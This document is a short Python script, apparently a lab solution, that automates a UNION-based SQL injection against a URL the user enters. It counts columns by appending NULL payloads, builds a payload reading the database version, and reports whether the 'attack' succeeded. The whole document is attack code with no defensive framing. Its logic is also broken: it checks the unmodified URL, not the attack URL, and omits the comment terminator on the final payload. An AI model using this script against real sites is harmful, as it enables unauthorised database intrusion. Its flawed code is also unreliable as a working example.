import requests
    
def determinar_numero_columnas(url):
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        peticion = requests.get(url+sql_payload+"-- - ")
        if peticion.status_code  == 200:
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
    return False

def payload(n_columnas):
    array = ['NULL']*(n_columnas)
    array[0] = '@@version'
    return "'+UNION+SELECT+" + ','.join(map(str,array))

def atacar(url):
    peticion = peticion = requests.get(url)
    html = peticion.text
    if "'8.0.35-0ubuntu0.20.04.1'" in html:
        return True
    return False

if __name__ == "__main__":
    print("Ingrese URL: ", end="")
    url = input()
    n_columnas = determinar_numero_columnas(url)
    url_ataque = url + payload(n_columnas)
    if(atacar(url)):
        print ("El ataque ha sido exitoso")
    else:
        print ("El ataque ha fallado")